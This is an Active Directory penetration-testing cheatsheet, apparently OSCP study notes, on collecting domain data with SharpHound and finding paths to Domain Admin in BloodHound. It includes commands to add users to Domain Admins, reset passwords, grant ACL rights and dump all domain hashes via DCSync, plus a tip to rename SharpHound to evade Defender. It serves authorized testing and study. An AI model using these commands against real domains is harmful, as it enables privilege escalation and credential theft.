# BloodHound + SharpHound Cheatsheet

> BloodHound maps Active Directory visually and finds attack paths automatically. SharpHound collects the data; BloodHound analyzes it. This is your primary AD enumeration weapon.

---

## The Two Components

- **SharpHound** — the collector. Runs on/against the domain, gathers users, groups, computers, sessions, ACLs, etc. Outputs JSON (usually zipped).
- **BloodHound** — the analyzer. A GUI that ingests SharpHound's data and draws the domain as a graph, showing attack paths to Domain Admin.

---

## Step 1 — Collect Data with SharpHound

### Option A — SharpHound.exe on a domain-joined Windows machine
```cmd
# Run all collection methods
.\SharpHound.exe -c All

# Specify domain and DC
.\SharpHound.exe -c All -d corp.com --domaincontroller <DC_IP>

# Stealthier / lighter collection
.\SharpHound.exe -c Session,LoggedOn,ACL
```

### Option B — SharpHound.ps1 (PowerShell)
```powershell
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public\
```

### Option C — Python collector from Kali (no Windows needed)
```bash
bloodhound-python -u username -p password -d corp.com -ns <DC_IP> -c All --zip
```

This is huge for OSCP — run it from Kali through your pivot (Ligolo) without touching a Windows box.

**Collection methods (-c):**
| Method | Collects |
|--------|----------|
| All | Everything (default choice) |
| Session | Active sessions (where users are logged in) |
| LoggedOn | Logged-on users |
| ACL | Object permissions (attack paths) |
| Group | Group memberships |
| Trusts | Domain trusts |

---

## Step 2 — Transfer the Data

SharpHound outputs a `.zip` (or JSON files). Get it back to Kali:
```cmd
# From the Windows target, download to Kali via SMB/HTTP, or
# serve it and grab from Kali
```

---

## Step 3 — Set Up BloodHound on Kali/Docker

```bash
# Go to /home/wai/bloodhound-ce
cd /home/wai/bloodhound-ce

# Open bloodhound via docker
sudo docker-compose up

# Access bloodhound via website
http://localhost:8080
```

---

## Step 4 — Ingest the Data

In BloodHound GUI:
1. Click **Upload Data** (or drag the zip onto the window)
2. Select the SharpHound `.zip` or JSON files
3. Wait for import to finish

---

## Step 5 — Analyze — Pre-Built Queries

Click the **Analysis** tab and run these built-in queries:

| Query | What it finds |
|-------|---------------|
| Find all Domain Admins | The ultimate targets |
| Find Shortest Paths to Domain Admins | Your attack path (THE key query) |
| Find Principals with DCSync Rights | Who can dump all hashes |
| Find Computers where Domain Users are Local Admin | Easy footholds |
| Find Kerberoastable Accounts | SPN accounts to roast |
| Find AS-REP Roastable Users | Users without Kerberos preauth |
| Shortest Paths from Owned Principals | Paths from what you already control |

**The single most important:** mark your owned users/computers, then run **Shortest Paths from Owned Principals to Domain Admins**.

---

## Step 6 — Mark What You Own

Right-click any node you control → **Mark as Owned**.

Then BloodHound can compute paths FROM your foothold TO Domain Admin — the exact steps you need.

---

## Reading the Graph

Nodes (icons):
- **User** — person icon
- **Group** — multiple people
- **Computer** — monitor
- **Domain** — globe

Edges (arrows) = relationships/rights. Key ones:
| Edge | Meaning / abuse |
|------|-----------------|
| MemberOf | Is a member of a group |
| AdminTo | Is local admin on a computer |
| HasSession | Has an active session (creds in memory) |
| GenericAll | Full control → password reset / add member |
| GenericWrite | Modify attributes |
| WriteDACL | Modify permissions → grant self GenericAll |
| WriteOwner | Take ownership → grant self rights |
| ForceChangePassword | Reset target's password |
| CanRDP | Can RDP to a computer |
| CanPSRemote | Can WinRM to a computer |
| DCSync | Can replicate/dump all domain hashes |

**Right-click any edge → Help** — BloodHound gives you the exact abuse commands for that relationship.

---

## The Attack Workflow

```
1. Get initial foothold + domain credentials
2. Run SharpHound (or bloodhound-python from Kali)
3. Import into BloodHound
4. Mark your owned user/computer as Owned
5. Run "Shortest Paths from Owned to Domain Admins"
6. Follow the path edge by edge:
   - Each edge = one attack (password reset, add to group, etc.)
   - Right-click edge → Help for the exact command
7. Chain the attacks → reach Domain Admin → own the domain
```

---

## Common Attack Path Examples

**Path via group membership + ACL:**
```
YOU --MemberOf--> HelpDesk --GenericAll--> Domain Admins
```
Abuse: You're in HelpDesk, HelpDesk has GenericAll over Domain Admins → add yourself to Domain Admins.

**Path via session:**
```
YOU --AdminTo--> SERVER01 <--HasSession-- DomainAdmin
```
Abuse: You're admin on SERVER01, a Domain Admin has a session there → compromise SERVER01, dump their creds with Mimikatz.

**Path via Kerberoasting:**
```
svc_sql (Kerberoastable, MemberOf Domain Admins)
```
Abuse: Roast svc_sql, crack the hash → it's a Domain Admin.

---

## Abusing Common Edges — Quick Commands

**GenericAll / AddMember over a group:**
```powershell
Add-DomainGroupMember -Identity "Domain Admins" -Members youruser
```

**GenericAll / ForceChangePassword over a user:**
```powershell
Set-DomainUserPassword -Identity target -AccountPassword (ConvertTo-SecureString 'Pass123!' -AsPlainText -Force)
```

**WriteDACL over an object:**
```powershell
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity youruser -Rights All
```

**DCSync rights:**
```bash
impacket-secretsdump corp.com/youruser:password@<DC_IP>
```

---

## Notes for OSCP

- **bloodhound-python from Kali** is often easiest — run through your Ligolo pivot with domain creds, no need to run SharpHound on a Windows box.
- **Mark owned nodes** — the "from owned" queries are what turn BloodHound from a map into a step-by-step attack plan.
- **Right-click edges for Help** — every edge has built-in abuse instructions. You don't need to memorize every technique.
- SharpHound.exe is flagged by Defender — rename it or use the PowerShell/Python collectors.
- Data is a snapshot — sessions change, so re-collect if the environment shifts.

---

## References
- BloodHound docs: https://bloodhound.readthedocs.io/
- SharpHound: https://github.com/BloodHoundAD/SharpHound
- bloodhound-python: https://github.com/dirkjanm/BloodHound.py
